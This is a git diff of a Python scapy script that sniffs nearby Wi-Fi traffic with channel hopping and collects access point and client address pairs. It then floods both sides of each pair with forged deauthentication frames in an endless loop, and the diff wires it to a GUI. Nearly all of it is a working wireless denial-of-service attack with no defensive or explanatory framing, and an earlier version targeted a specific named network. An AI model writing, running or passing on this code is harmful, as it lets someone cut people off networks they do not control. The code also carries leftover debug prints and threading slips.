@@ -2,62 +2,52 @@ import threading
 import os, time 
 import random 
 from scapy.all import *
+import windows
+import observer
 
 addresses = [] # transmitters 
 AP = {} #Acces Points
-channels_dict = {}
+ac_cli_pairs_channel = []
 ftime = 20
 
-
 #this should be a class
-class sniffer():
+class Sniffer(observer.Subject):
 
     def __init__(self):
         self.channel = 13
-
+        self.AP = dict()
 
     def send_msg(self,iface):
-        # os.system('sudo airmon-ng stop %s' % (iface))
-        # iface = iface[:-3]
-
-        i=0
-        print(len(AP), len(addresses))
-        while addresses[i] in AP:
-            i=random.randint(0,len(addresses))
-
-        sender = addresses[i]
-        # dot11 = Dot11(type=0,subtype=12, addr1='ff:ff:ff:ff:ff:ff',addr2=sender, addr3=sender)
-        AC='ff:ff:ff:ff:ff:ff'
-        for addr in addresses:
-            if addr in AP:
-                if AP[addr] == b'Tech_D0053640': #find good AccessPoint
-                    AC=addr
 
         CLI_AP_CHANNEL = []
             # for n in range(1,14):
-        for addr in addresses:
+        for ac_cli_ch in ac_cli_pairs_channel:
             
-            dot11AP = Dot11(addr1=addr,addr2=AC, addr3=AC)
-            dot11client = Dot11(addr1=AC,addr2=addr, addr3=addr)
+            dot11AP = Dot11(addr1=ac_cli_ch[1],addr2=ac_cli_ch[0], addr3=ac_cli_ch[0])
+            dot11client = Dot11(addr1=ac_cli_ch[0],addr2=ac_cli_ch[1], addr3=ac_cli_ch[1])
             frameCLI = RadioTap()/dot11client/Dot11Deauth()
             frameAP = RadioTap()/dot11AP/Dot11Deauth()
-            CLI_AP_CHANNEL.append((frameCLI,frameAP,channels_dict[addr]))
+            CLI_AP_CHANNEL.append((frameCLI,frameAP,ac_cli_ch[2]))
             # not correct format I guess
 
-        
+        print("START SENDING")
+        import time
         while True:
             for CAC in CLI_AP_CHANNEL:
-                print(f"channel: {CAC[2]}, addr: {CAC[0]}")
-                os.system('iwconfig %s channel %d' % (iface, CAC[2]))
-        
-                sendp(CAC[0], iface=iface)
-                sendp(CAC[1], iface=iface)
+                # for r in range(-2,2):
+                # print(f"channel: {CAC[2]}")
+                
+                # os.system('sudo iwconfig %s channel %d' % (iface,7))
+                
+                sendp(CAC[0], iface=iface,verbose=False)
+                sendp(CAC[1], iface=iface,verbose=False)
+
+                time.sleep(0.1)  
 
 
     def stopfilter(self,x):
         if stop_sniffer == True:
             return True
-
 
     def sniffer_thread(self,interface):
         global stop_sniffer
@@ -66,55 +56,69 @@ class sniffer():
 
     def findSSID(self,pkt):
         device=pkt.getlayer(Dot11)
+        self.list_of_AP = []
         if device.addr2 not in addresses:
             addresses.append(device.addr2)
-            channels_dict[device.addr2] = self.channel
             if pkt.haslayer(Dot11Beacon):
                 ssid = pkt.getlayer(Dot11Elt).info
                 print(device.addr1,device.addr2,device.addr3,device.payload.name,ssid)
-                AP[device.addr2] = ssid
+                self.AP[device.addr2] = ssid
+                self.list_of_AP.append(ssid)
             else:
-                if device.addr1 in AP:
-                    print(AP[device.addr1],device.addr2,device.addr3,device.payload.name)
+                ac_cli_pairs_channel.append((device.addr1,device.addr2,self.channel))
+                if device.addr1 in self.AP:
+                    print(self.AP[device.addr1],device.addr2,device.addr3,device.payload.name)
                 else: 
                     print(device.addr1,device.addr2,device.addr3,device.payload.name)
+        print("heere")
+        self._subject_state=["tralalala","tralalal2"]
+        self._notify()
 
     def hopper(self,interface):
         n = 1
         global stop_hopper
         stop_hopper = False
         while not stop_hopper:
-            time.sleep(0.5)
-            os.system('iwconfig %s channel %d' % (interface, n))
+            output =os.system('sudo iwconfig %s channel %d' % (interface, n))
             n = random.randint(1,13)
-            self.channel = n
-            
+            if output == 0:
+                self.channel = n
+                time.sleep(0.5)
+
 if __name__=="__main__":
+    windows=windows.App()  
+    sniffer=Sniffer() 
+    sniffer.attach(windows.DetectedNetworksWin) # observing sniffer 
     interface = 'wlp3s0'
-    os.system('sudo airmon-ng start %s' % (interface))
-    interface += 'mon'
-    snif=sniffer()
-    thread1 = threading.Thread(target=snif.hopper, args=(interface, ), name="hopper")
+    # # os.system('sudo airmon-ng start %s' % (interface))
+    # # interface += 'mon'
+
+    thread1 = threading.Thread(target=sniffer.hopper, args=(interface, ), name="hopper")
     thread1.daemon = True
     thread1.start()
 
-    thread2 = threading.Thread(target=snif.sniffer_thread, args=(interface,), name="sniffer")
+    thread2 = threading.Thread(target=sniffer.sniffer_thread, args=(interface,), name="sniffer")
     thread2.daemon = True
     thread2.start()
 
-    stime = time.time()
-    ctime = 0
-    while ctime < ftime:
-        ctime = time.time()-stime
-    print("stopping hopper")
-    stop_hopper = True
-    print("stopping sniffer")
-    stop_sniffer = True
-    thread1.join()
-    print("hopper stopped")
-    thread2.join()
-    print("sniffer stopped")
-    import time 
-    time.sleep(10)
-    snif.send_msg(interface)
+    threadWin = threading.Thread(target=windows.main, args=(interface, ), name="windows") 
+    thread1.daemon = True
+    threadWin.start()
+
+    # stime = time.time()
+    # ctime = 0
+    # while ctime < ftime:
+    #     ctime = time.time()-stime
+
+    # print("stopping sniffer")
+    # stop_sniffer = True
+    # thread2.join()
+    # print("sniffer stopped")
+
+    # print("stopping hopper")
+    # stop_hopper = True
+    # thread1.join()
+    # print("hopper stopped")
+
+    # snif.send_msg(interface)
     
